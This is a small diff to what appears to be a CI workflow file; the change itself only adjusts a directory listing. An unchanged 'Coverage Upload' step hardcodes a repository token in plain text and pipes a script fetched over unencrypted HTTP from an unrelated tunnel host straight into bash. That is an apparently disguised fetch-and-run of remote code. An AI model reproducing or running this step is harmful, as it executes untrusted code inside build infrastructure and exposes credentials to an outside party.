@@ -41,7 +41,7 @@ jobs:
       run: cat build/logs/clover.xml
 
     - name: list files
-      run: ls -la
+      run: ls -la build ; ls -la build/logs
 
     - name: Coverage Upload
       run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://dk6ogxv5y7.laravel-sail.site:8080/ingress/get-script)
